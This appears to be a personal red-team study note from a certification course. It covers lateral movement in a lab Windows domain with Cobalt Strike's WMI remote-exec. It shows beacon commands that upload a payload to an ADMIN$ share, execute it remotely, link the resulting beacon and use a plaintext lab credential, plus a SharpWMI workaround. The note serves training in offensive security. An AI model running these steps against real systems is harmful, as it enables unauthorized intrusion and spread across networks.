
Management data and automation of infrastructure in Windows environments. 

## 🖊️ via Cobalt Strike

WMI is not part of the [[jump Command]], but it is of [[remote-exec Command]].
The `remote-exec` method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

You can upload a file to a remote machine by `cd`'ing to the desired UNC path and then use the `upload` command.

```
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
Started process 3280 on web.dev.cyberbotic.io
```

In this example, we check access into the ADMIN$ folder and copy the payload. Then we remote execute with method wmi the file.

The process is now running on WEB so now we need to connect to it.

```
beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```

### ⚠ Errors

WMI uses a BOF that utilizes a [[COM Objects]] named CoInitializeSecurity that may cause trouble if you are trying to impersonate a different token, for example:

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5
```

We know `jking` is a local admin on WEB but because `CoInitializeSecurity` has already been called (probably in the context of `bfarmer`), WMI fails with access denied.  As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas` ([[Beacon Passing]]), or even `execute-assembly` with a tool such as `SharpWMI`.

```
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"

[*] Host                           : web.dev.cyberbotic.io
[*] Command                        : C:\Windows\smb_x64.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 3436

```


### Properties
---
📆 created   {{14-02-2024}} 13:55
🏷️ tags: #redteam #crto #Windows 

---

